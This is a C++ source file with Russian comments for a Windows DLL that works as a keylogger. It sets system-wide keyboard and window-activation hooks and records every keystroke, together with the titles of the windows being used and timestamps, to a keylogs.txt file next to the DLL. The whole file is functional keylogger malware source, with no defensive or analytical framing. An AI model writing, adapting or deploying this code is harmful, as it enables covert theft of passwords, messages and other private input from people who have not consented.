// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <stdio.h>

#pragma data_seg(".hdata")                       // секция в памяти общая для всех
HINSTANCE hi = NULL;
int mcount = 0;
#pragma data_seg()                               // конец секции
#pragma comment(linker, "/section:.hdata,rws")   // даем права этой секции

#ifdef __cplusplus

#define EXPORT extern "C" __declspec(dllexport)

#else

#define EXPORT __declspec (dllexport)

#endif // __cplusplus

EXPORT BOOL SetKeyboardHook(void);  // экспортируемая функция

HANDLE hFile   = NULL;
HHOOK hKeyHook = NULL;
HHOOK hCBTHook = NULL;

/********************************************
	ЗАПИСЫВАЕТ ДАТУ И ВРЕМЯ
********************************************/
void WriteTime(void)
{
	DWORD           NOfBytes;
	OVERLAPPED      ovlp;     // структура для асинхронного ввода вывода данных
	DWORD           ffsze;
	SYSTEMTIME      time;
	char buffer[30];

	GetLocalTime(&time);
	sprintf_s(buffer, "\r\n%02d.%02d.%d %02d:%02d", time.wDay, time.wMonth, time.wYear, time.wHour, time.wMinute);
	ffsze = GetFileSize(hFile, NULL);

	ovlp.OffsetHigh = 0;
	ovlp.hEvent = NULL;
	ovlp.Offset = ffsze;  // смещение от начала файла(для продолжения записи с конца)

	/*  1 - дескриптор файла
		2 - буфер данных
		3 - число байтов для записи
		4 - указывае на переменную которая получает число записанных батов
		5 - структура для звписи в файл */
	WriteFile(hFile, buffer, strlen(buffer), &NOfBytes, &ovlp);
}

/********************************************
	ЗАПИСЫВАЕТ ИМЯ ОКНА
********************************************/
void WriteTitle(HWND hWnd)
{
	WriteTime();

	DWORD        NOfBytes;
	OVERLAPPED   ovlp;         // структура для асинхронного ввода вывода данных
	DWORD        ffsze;
	char         buffer[250];
	char         title[256];

	/*  извлекает заголовок окна
		1 - дескриптор окна
		2 - адрес буфера для текста
		3 - максимальное число символов для копирования */
	GetWindowTextA(hWnd, title, 100);
	sprintf_s(buffer, "%s\r\n", title);

	ffsze = GetFileSize(hFile, NULL);
	ovlp.OffsetHigh = 0;
	ovlp.hEvent = NULL;
	ovlp.Offset = ffsze;

	WriteFile(hFile, buffer, strlen(buffer), &NOfBytes, &ovlp);
}

/*********************************************
	ПЕРЕВОДИТ КОД СИМВОЛА В ТЕКСТ
*********************************************/
short GetSymbolFromVK(WPARAM wParam)
{
	BYTE    btKeyState[256];
	WORD    Symbol;
	HKL     hklLayout = GetKeyboardLayout(0);   //  возвращает раскладку клавиатуры

	GetKeyboardState(btKeyState);  //  копирует состояние 256 вирт. клавиш в буфер

	/* MapVirtualKey - определяет скэн-код для клавиши
	   GetKeyState   - извлекает данные о состоянии заданной вирт. клавиши
	   ToAsciiEx - переводит код вирт. клавиши в символ используя язык ввода:
	   1 - код вирт. клавиши
	   2 - скэн код
	   3 - массив состояния клавиш
	   4 - сюда пишется оттранслированный символ
	   5 - флажок активного меню
	   6 - раскладка на клавитатуре, для перевода нашего символа в нужный
	   если ф-я == 1 значит 1 символ был скопирован на буфер
	*/
	if (ToAsciiEx(wParam, MapVirtualKey(wParam, 0), btKeyState, &Symbol, 0, hklLayout) == 1 &&
		GetKeyState(VK_CONTROL) >= 0 && GetKeyState(VK_MENU) >= 0)
	{
		return Symbol;
	}

	return -1;
}

/**********************************************
	ПИШЕТ НАЖАТЫЙ СИМВОЛ В ФАЙЛ
**********************************************/
void WriteSymbol(WPARAM wParam)
{
	DWORD         NOfBytes;
	OVERLAPPED    ovlp;       // структура для асинхронного ввода вывода данных
	DWORD         ffsze;
	WORD          wc;

	ffsze = GetFileSize(hFile, NULL);

	ovlp.OffsetHigh = 0;
	ovlp.hEvent = NULL;
	ovlp.Offset = ffsze;

	if (wParam == VK_RETURN)
	{
		WriteFile(hFile, "\r\n", 2, &NOfBytes, &ovlp);
		mcount++;
	}
	else if ((wc = GetSymbolFromVK(wParam)) != -1)
	{
		// iswprint - проверяет можно ли печатать заданный символ
		if (iswprint(wc))
		{
			WriteFile(hFile, &wc, 1, &NOfBytes, &ovlp);
			mcount++;
		}
		else
		{
			WriteFile(hFile, &wc, 1, &NOfBytes, &ovlp);
			mcount++;
		}
	}

	//if (mcount > 5)
	//{
		//mcount = 0;
		//PostMessage(GetForegroundWindow(), WM_INPUTLANGCHANGEREQUEST, 2, 0);
	//}
}

/**********************************************
	ПЕРЕХВАТ НАЖАТИЯ КЛАВИШ
**********************************************/
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode)
	{
		return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
	}

	if (lParam >= 0)
	{
		WriteSymbol(wParam);
	}

	return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

/**********************************************
	ПЕРЕХВАТ ОТКРЫТИЯ НОВОГО ОКНА
**********************************************/
LRESULT WINAPI CBTProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	// HCBT_ACTIVATE - окно готовится к активизации
	if (nCode == HCBT_ACTIVATE)
	{
		// в данном случае wParam является хэндлом окна
		WriteTitle((HWND)wParam);
	}

	// во всех остальных случаях передаем дальше
	return CallNextHookEx(hCBTHook, nCode, wParam, lParam);
}

/**********************************************
	СОЗДАЕТ ЛОВУШКИ
**********************************************/
BOOL SetKeyboardHook(void)
{
	/* 1 - тип хука
		   WH_KEYBOARD - контроль за нажатиями клавиш
	   2 - указывает на процедуру которая обрабатывает сообщения
	   3 - указывает на дескриптор DLL содержащий процедуры фильтра(2 параметр)
		   NULL - если 4 параметр устанавливает поток созданный текущим процессом
		   и процедура фильтра находится внутри кода текущего процесса(не DLL)
	   4 - пока хз */
	hKeyHook = SetWindowsHookEx(WH_KEYBOARD, &KeyboardProc, hi, 0);

	hCBTHook = SetWindowsHookEx(WH_CBT, &CBTProc, hi, 0);

	return hKeyHook && hCBTHook;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:     //вызывается каждый раз когда новый процесс грузит DLL
	{
		if (!hi)
		{
			hi = hModule;
		}

		char pfad[MAX_PATH];
		GetModuleFileNameA(hi, pfad, MAX_PATH);   // путь к нашей DLL
		*(strrchr(pfad, '\\') + 1) = '\0';
		strcat_s(pfad, "keylogs.txt");

		if ((hFile = CreateFileA(pfad, GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
			OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
		{
			return FALSE;
		}
		break;
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

